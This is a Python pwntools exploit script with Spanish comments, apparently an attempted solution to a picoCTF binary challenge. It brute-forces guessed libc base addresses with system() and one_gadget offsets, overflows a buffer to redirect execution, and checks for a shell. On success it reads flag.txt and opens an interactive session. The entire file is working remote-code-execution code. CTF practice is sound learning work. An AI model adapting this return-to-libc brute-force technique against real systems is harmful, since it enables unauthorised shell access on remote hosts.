#!/usr/bin/env python3
"""
Estrategia minimalista: ret2libc con un solo gadget

Voy a intentar saltar directamente a system() asumiendo que:
1. rdi ya contiene un puntero útil (como a una string en el stack)
2. O saltar a un one_gadget de libc

Esto es un longshot pero vale la pena intentarlo.
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = 'shape-facility.picoctf.net'
PORT = 49954

#Direcciones de libc típicas para probar
libc_bases = [
    0x7ffff7d00000,
    0x7ffff7c00000,
    0x7ffff7e00000,
]

# Offsets comunes para system() y one_gadgets en libc 2.35
system_offsets = [0x50d70]
one_gadget_offsets = [
    0xebc81,
    0xebc85,
    0xebc88,
    0xebce2,
]

for libc_base in libc_bases:
    for offset in system_offsets + one_gadget_offsets:
        addr = libc_base + offset
        log.info(f"Probando {hex(addr)}")
        
        try:
            io = remote(HOST, PORT, level='error')
            
            io.sendlineafter(b'Exit the app\n', b'1', timeout=1)
            io.sendlineafter(b'name: \n', b'/bin/sh\x00', timeout=1)
            
            payload = b'A'*8 + b'B'*4 + b'C'*8 + p64(addr)
            io.sendlineafter(b'Exit the app\n', b'3', timeout=1)
            io.sendlineafter(b'appreciate it: \n', payload, timeout=1)
            
            io.send(b'echo SUCCESS\n')
            resp = io.recv(timeout=0.5)
            
            if b'SUCCESS' in resp:
                log.success(f"¡Shell con {hex(addr)}!")
                io.sendline(b'cat flag.txt')
                print(io.recvall(timeout=2).decode(errors='ignore'))
                io.interactive()
                break
            
            io.close()
        except:
            try:
                io.close()
            except:
                pass
    else:
        continue
    break

log.error("No funcionó")
